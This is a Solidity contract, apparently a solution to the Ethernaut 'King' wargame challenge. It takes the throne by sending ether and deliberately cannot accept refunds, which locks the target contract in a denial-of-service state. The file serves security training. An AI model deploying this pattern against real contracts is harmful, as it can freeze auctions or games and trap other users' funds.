// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution for https://ethernaut.openzeppelin.com/ challenge 10 (King)

contract KingBreaker {
    // No receive() or fallback() - contract cannot accept ether
    // This will cause King contract to be stuck!
    
    function becomeKing(address payable kingAddress) external payable {
        // Use call to send ether and trigger King's receive() function
        (bool success, ) = kingAddress.call{value: msg.value}("");
        require(success, "Failed to become king");
    }
}
